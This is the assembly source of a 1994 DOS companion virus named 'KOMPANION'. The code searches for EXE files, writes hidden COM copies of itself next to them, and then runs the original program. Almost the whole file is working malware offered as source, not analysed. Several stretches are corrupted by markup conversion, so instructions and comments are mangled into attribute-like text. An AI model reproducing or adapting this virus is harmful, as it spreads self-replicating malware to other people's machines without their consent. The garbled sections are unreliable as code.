

;*****************************************************************************
;                             K”MPANION VIRUS
;
; AUTHOR:  K”hntark 
; DATE:    FEBRUARY 1994
; EXE infector companion virus
;
; File Type: COM
; Processor: 8086/88
; Size: 270 bytes
; Memory Needed:     1 Kb
; Subroutines:    2
;*****************************************************************************
 

CSEG            SEGMENT BYTE
                ASSUME cs:CSEG,ds:CSEG,ss:CSEG  ;< cs="ss" =="" ds="es">
                ORG     100h

FILESIZE        equ     offset THY_END - offset MAIN

MAIN:
                jmp     short START             ;ds:0100 

;-----------------------------------------------------------------------------

EXE_MASK:       db      '*.EXE'                 ;ds:0102 
COM_MASK        db      'COM',0                 ;ds:0107 

DTA             db      43d dup (00h)           ;ds:010b
FILENAME        db      13d dup ('?')           ;ds:0136 

                                                ;parameter block
PSP_SEG         dw      0000                    ;ds:0143 segment address of environment string 
                
                dw      0080h
PAR_BLK1        dw      0000                    ;ds:0147 ptr to command line to be placed at PSP + 80h

                dw      005Ch
PAR_BLK2        dw      0000                    ;ds:014b ptr to default PSP + 5Ch

                dw      006Ch
PAR_BLK3        dw      0000                    ;ds:014f ptr to default PSP + 6Ch

FILEHANDLE      dd      00                      ;ds:0151

;---------------------->>>> starts execution here <------------------------ start:="" ;*************************************************="" ;="" modify="" allocated="" memory="" blocks="" shrink="" memory="" ;*************************************************="" mov="" bx,0050h="" ;bx="#" of="" paragraphs="1280" bytes="" mov="" ah,4ah="" ;function="" 4ah="" int="" 21h="" ;set="" mem="" block="" es:0000="" ;************************************="" ;="" store="" segments="" for="" parameter="" block="" ;************************************="" mov="" ax,word="" ptr="" cs:002ch="" ;psp_envir="" segment=""> ax
                mov     word ptr PSP_SEG,ax     ;store PSP segment
                
                mov     word ptr PAR_BLK1,cs    ;store CS 
                mov     word ptr PAR_BLK2,cs    ;store CS 
                mov     word ptr PAR_BLK3,cs    ;store CS 
                
                call    EXECUTE                 ;execute program
                
;*********************************                
; Shift DTA Down
;*********************************
                
                mov     byte ptr DTA,00         ;0 in first DTA byte 
                mov     si,offset DTA           ;move from DS:SI
                mov     di,offset DTA + 1       ;move to ES:DI
                mov     cx,002Bh                ;# of bytes to move  = 43
                cld                             ;Forward String Opers
                repz    movsb                   ;Mov DS:[SI]->ES:[DI]

;*********************************                
; Set DTA
;*********************************
                
                mov     ah,1Ah                  ;set DTA function
                mov     dx,offset DTA           ;set DTA to DS:DX
                int     21h                     ;set dta  DS:DX=dta addr

;*********************************                
; Find 1st EXE file to infect
;*********************************
                
                mov     ah,4Eh                  ;find 1st file function
                xor     cx,cx                   ;cx = 0 all attributes
                mov     dx,offset EXE_MASK      ;dx = file mask
                int     21h                     ;srch for 1st, DS:DX=path
                jb      EXIT                    ;exit if no file found

;********************                
; Move filename
;********************

AGAIN:          mov     si,0129h                ;move filename from DTA
                mov     di,offset FILENAME      ;move to FILENAME location
                mov     cx,000Ch                ;move 12 bytes
                cld                             ;Forward String Opers
                repz    movsb                   ;Mov DS:[SI]->ES:[DI]

;*****************************************                
; Find dot (filename extension separator)
;*****************************************

                mov     bx,001Dh                ;original index
FIND_DOT:       inc     bx                      ;increase index
                cmp     byte ptr DTA[bx],2Eh    ;2Eh = '.'
                jne     FIND_DOT                ;Jump not equal(ZF=0)

;****************************************                
; Mov COM extension to filename
;****************************************
                
                mov     si,offset COM_MASK      ;si = source 'COM0' offset
                inc     bx                      ;fix index 
                lea     di,word ptr DTA[bx]     ;di = destination
                mov     cx,0004h                ;cx=4 bytes
                cld                             ;Forward String Opers
                repz    movsb                   ;Mov DS:[SI]->ES:[DI]

;*****************************                
; Create companion COM file
;*****************************
                
                mov     dx,0129h                ;dx DTA COM filename offset
                call    CREATE_COMPANION        ;call subroutine
                
;*********************************                
; Find next EXE file to infect
;*********************************
                
                mov     ah,4Fh                  ;search for next file function
                int     21h                     ;search for next
                jnb     AGAIN                   ;do it again

EXIT:           retn                            ;return to caller

NAME_AUTHOR     db      'K”MPANION / K”hntark'

;-----------------------------------------------------------------------------
;****************************
; CREATE COMPANION COM FILE
;****************************
 
CREATE_COMPANION        PROC NEAR               
                
;*********************
; Create COM file
;*********************
                
                mov     ah,3Ch                  ;create file function 
                mov     cx,0002h                ;cx = attributes = hidden 
                int     21h                     ;create file, DS:DX=name
                jb      OH_NO                   ;Jump if < (no="" sign)="" ;***********************************="" ;="" write="" virus="" to="" companion="" com="" file="" ;***********************************="" mov="" word="" ptr="" filehandle,ax="" ;store="" file="" handle="" push="" dx="" ;save="" filename="" offset="" mov="" bx,word="" ptr="" filehandle="" ;bx="file" handle="" mov="" cx,filesize="" ;cx="#" bytes="" to="" write="" mov="" dx,0100h="" ;write="" from="" ds:0100h="" mov="" ah,40h="" ;write="" to="" file="" function="" int="" 21h="" ;write="" file,="" bx="handle" ;***************="" ;="" close="" file="" ;***************="" pop="" dx="" ;restore="" filename="" offset="" mov="" bx,word="" ptr="" filehandle="" ;bx="file" handle="" mov="" ah,3eh="" ;close="" file="" function="" int="" 21h="" ;close="" file,="" bx="handle" oh_no:="" retn="" ;return="" to="" 0000=""> int 20h in PSP

CREATE_COMPANION        ENDP
 
;-----------------------------------------------------------------------------
;****************************
; Execute EXE program
;****************************

EXECUTE         PROC NEAR                        
                
                mov     dx,offset FILENAME      ;stored EXE program name at ES:DX
                mov     bx,offset PSP_SEG       ;parameter block at ES:BX
                mov     ax,4B00h                ;load & execute program function
                int     21h                     ;execute prog.
                retn                            ;return to caller

EXECUTE         ENDP

;-----------------------------------------------------------------------------

THY_END:

CSEG            ENDS
 
                END     MAIN
 

</------------------------>